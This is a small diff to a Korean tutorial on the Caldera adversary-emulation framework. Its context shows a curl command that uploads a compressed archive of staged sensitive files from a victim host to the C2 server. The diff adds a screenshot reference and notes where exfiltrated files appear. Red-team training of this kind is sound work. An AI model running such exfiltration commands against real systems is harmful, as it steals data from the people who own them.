@@ -79,6 +79,12 @@ curl -F "data=@/home/biz-jeongwon/staged.tar.gz" --header "X-Request-ID: `hostna
 
 - 실제 실행되는 Attack Chain의 Command line입니다.
   - Victim host에 staging directory를 생성하고, sensitive file을 해당 directory에 옮긴 후, 압축하여 C2 server(Caldera server)로 curl을 통해 보냅니다.
+
+![image](assets/img/usage-of-caldera/exfill_file.png)
+- `Configuration/Exfilled Files`에서 Victim host로부터 훔친 파일을 확인할 수 있습니다.
+ 
+
+
  
 
 
